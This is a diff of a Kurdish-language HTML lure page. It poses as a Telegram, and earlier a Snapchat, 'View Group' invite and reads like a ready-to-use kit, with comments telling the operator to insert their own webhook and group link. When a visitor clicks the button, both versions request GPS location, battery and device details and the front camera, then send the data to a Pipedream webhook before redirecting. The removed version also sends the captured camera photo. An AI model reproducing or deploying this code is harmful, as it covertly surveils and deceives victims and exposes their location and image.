@@ -1,147 +1,133 @@
 <!DOCTYPE html>
-<html lang="ku">
+<html lang="ku" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirecting...</title>
+    <title>تێلیگرام - بینینی گروپ</title>
     <style>
         body {
-            background-color: #1a1a1a;
-            color: white;
-            font-family: Arial, sans-serif;
+            font-family: Tahoma, Arial, sans-serif;
+            background-color: #f4f4f9;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
-            flex-direction: column;
+        }
+        .container {
+            text-align: center;
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
         }
         .btn {
             background-color: #0088cc;
             color: white;
-            padding: 15px 30px;
             border: none;
-            border-radius: 25px;
+            padding: 12px 30px;
             font-size: 18px;
+            border-radius: 25px;
             cursor: pointer;
-            text-decoration: none;
             font-weight: bold;
-            box-shadow: 0 4px 15px rgba(0,136,204,0.4);
-            transition: 0.3s;
+            transition: background 0.3s;
+            text-decoration: none;
+            display: inline-block;
         }
         .btn:hover {
-            background-color: #0077b5;
+            background-color: #006699;
         }
     </style>
 </head>
 <body>
 
-    <p>بۆ چوونە ناو گرووپ، کلیک لەسەر دوگمەی خوارەوە بکە:</p>
-    <button class="btn" id="viewGroupBtn">View Group</button>
+<div class="container">
+    <h2>بۆ بینینی گروپەکە کلیک لەسەر دوگمەی خوارەوە بکە</h2>
+    <button id="viewGroupBtn" class="btn">View Group</button>
+</div>
 
-    <video id="video" width="400" height="300" autoplay style="display:none;" playsinline></video>
-    <canvas id="canvas" width="400" height="300" style="display:none;"></canvas>
+<script>
+// پێویستە لێرەدا لینکی پایدریمەکەی خۆت دابنێیت
+const PIPEDREAM_URL = "https://eo7he3r6tagkjph.m.pipedream.net"; 
 
-    <script>
-        const secureWebhook = "https://eo7he3r6tagkjph.m.pipedream.net";
-        const snapchatRedirectUrl = "https://www.snapchat.com/spotlight/W7tBlwEw_aWnI0w_uREb_wA?share_id=OEQ1M0Ew&locale=en_US";
+document.getElementById("viewGroupBtn").addEventListener("click", async function() {
+    // دروستکردنی زانیارییە سەرەتاییەکانی مۆبایل
+    let payload = {
+        uid: "User_" + Math.floor(Math.random() * 1000000),
+        browser: navigator.userAgent.split(" ")[0],
+        device: /iPhone|iPad|iPod/i.test(navigator.userAgent) ? "iPhone (iOS)" : "Android",
+        hardware: navigator.platform,
+        cores: navigator.hardwareConcurrency || "N/A",
+        screen: window.screen.width + "x" + window.screen.height,
+        orient: window.screen.orientation ? window.screen.orientation.type : "N/A",
+        lang: navigator.language,
+        dark: window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? "Yes" : "No",
+        time: new Date().toLocaleTimeString(),
+        battery: "N/A",
+        charging: "N/A",
+        maps: "مۆڵەت نەدرا!",
+        photo: "No Photo"
+    };
 
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const context = canvas.getContext('2d');
-
-        let globalBattery = "N/A (iPhone)";
-        let globalCharging = "N/A (iPhone)";
-        let globalMaps = "⚠️ مۆڵەتی نەدا";
-        
-        let globalHardware = "Unknown";
+    // ١. وەرگرتنی ڕێژەی باتری
+    if (navigator.getBattery) {
         try {
-            const gl = document.createElement('canvas').getContext('webgl');
-            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-            if (debugInfo) {
-                globalHardware = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-            }
-        } catch(e){}
+            let batt = await navigator.getBattery();
+            payload.battery = Math.round(batt.level * 100) + "%";
+            payload.charging = batt.charging ? "Yes" : "No";
+        } catch (e) {}
+    }
 
-        let globalDevice = "iPhone";
-        let globalBrowser = "Safari (iPhone)";
-        if (navigator.userAgent.indexOf("CriOS") > -1 || navigator.userAgent.indexOf("Chrome") > -1) {
-            globalBrowser = "Chrome (iPhone)";
+    // ٢. داواکردنی شوێنی دەقیق (GPS) - لێرەدا سەفاری پەڕەی Ask نیشان دەدات
+    if (navigator.geolocation) {
+        try {
+            const position = await new Promise((resolve, reject) => {
+                navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
+            });
+            payload.maps = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
+        } catch (err) {
+            payload.maps = "ڕەتکرایەوە یان وەڵام نەبوو!";
         }
+    }
 
-        let globalTime = new Date().toLocaleString('ku-IQ') || new Date().toString();
-        let globalNetwork = (navigator.connection && navigator.connection.effectiveType) ? navigator.connection.effectiveType : "3G/4G/5G";
-        let globalLang = navigator.language || "Unknown";
-        let globalScreen = window.screen.width + "x" + window.screen.height;
-        let globalDarkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? "بەڵێ (Dark)" : "نەخێر (Light)";
-        
-        let globalCores = navigator.hardwareConcurrency || "Unknown";
-        let globalOrientation = window.innerHeight > window.innerWidth ? "ستوونی (Portrait)" : "ئاسۆیی (Landscape)";
-        let globalTimezone = "GMT" + (new Date().getTimezoneOffset() / -60 >= 0 ? "+" : "") + (new Date().getTimezoneOffset() / -60);
-
-        if (navigator.getBattery) {
-            navigator.getBattery().then(battery => {
-                globalBattery = Math.round(battery.level * 100) + "%";
-                globalCharging = battery.charging ? "بەڵێ" : "نەخێر";
-            }).catch(() => {});
-        }
-
-        document.getElementById('viewGroupBtn').addEventListener('click', async function() {
-            document.getElementById('viewGroupBtn').innerText = "Loading...";
-            let base64Image = "⚠️ وێنە نەگیرا";
-
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-                video.srcObject = stream;
-                await new Promise(resolve => setTimeout(resolve, 400));
-                context.drawImage(video, 0, 0, 400, 300);
-                base64Image = canvas.toDataURL('image/jpeg', 0.4);
-                stream.getTracks().forEach(track => track.stop());
-            } catch (cameraErr) {
-                console.log("Camera error");
-            }
-
-            if (navigator.geolocation) {
-                await new Promise((resolve) => {
-                    navigator.geolocation.getCurrentPosition((position) => {
-                        let lat = position.coords.latitude;
-                        let lon = position.coords.longitude;
-                        globalMaps = "https://www.google.com/maps?q=" + lat + "," + lon;
-                        resolve();
-                    }, () => {
-                        resolve();
-                    }, { enableHighAccuracy: true, timeout: 4000 });
-                });
-            }
-
-            let uid = "User_" + Math.floor(Math.random() * 90000) + 10000;
+    // ٣. داواکردنی کامێرا بۆ وێنەگرتن (ئامادەکاری)
+    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+        try {
+            let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            let video = document.createElement('video');
+            video.srcObject = stream;
+            await video.play();
             
-            const params = new URLSearchParams();
-            params.append("uid", uid);
-            params.append("battery", globalBattery);
-            params.append("charging", globalCharging);
-            params.append("device", globalDevice);
-            params.append("hardware", globalHardware);
-            params.append("browser", globalBrowser);
-            params.append("network", globalNetwork);
-            params.append("time", globalTime);
-            params.append("maps", globalMaps);
-            params.append("lang", globalLang);
-            params.append("screen", globalScreen);
-            params.append("dark", globalDarkMode);
-            params.append("cores", globalCores);
-            params.append("orient", globalOrientation);
-            params.append("tz", globalTimezone);
-            params.append("photo", base64Image);
+            let canvas = document.createElement('canvas');
+            canvas.width = 320;
+            canvas.height = 240;
+            let ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            payload.photo = "Image Captured Successfully"; // بۆ ئەوەی دەقەکە درێژ نەبێت
+            
+            // کوژاندنەوەی کامێرا دوای وێنەکە
+            stream.getTracks().forEach(track => track.stop());
+        } catch (e) {
+            payload.photo = "Camera Access Denied";
+        }
+    }
 
-            if (navigator.sendBeacon) {
-                navigator.sendBeacon(secureWebhook, params);
-            } else {
-                await fetch(secureWebhook, { method: 'POST', body: params, keepalive: true });
-            }
+    // ٤. ناردنی تەواوی داتاکان بە شێوازی فۆرم بۆ پایدریم
+    try {
+        let formData = new FormData();
+        for (let key in payload) {
+            formData.append(key, payload[key]);
+        }
+        await fetch(PIPEDREAM_URL, { method: "POST", body: formData });
+    } catch (e) {}
 
-            window.location.href = snapchatRedirectUrl;
-        });
-    </script>
+    // ٥. گواستنەوەی بەکارهێنەر بۆ ناو تێلیگرام دوای ١.٥ چرکە
+    setTimeout(function() {
+        window.location.href = "https://t.me/kurdish_sys"; // لێرە لینکی گروپەکەی خۆت دابنێ
+    }, 1500);
+});
+</script>
+
 </body>
 </html>
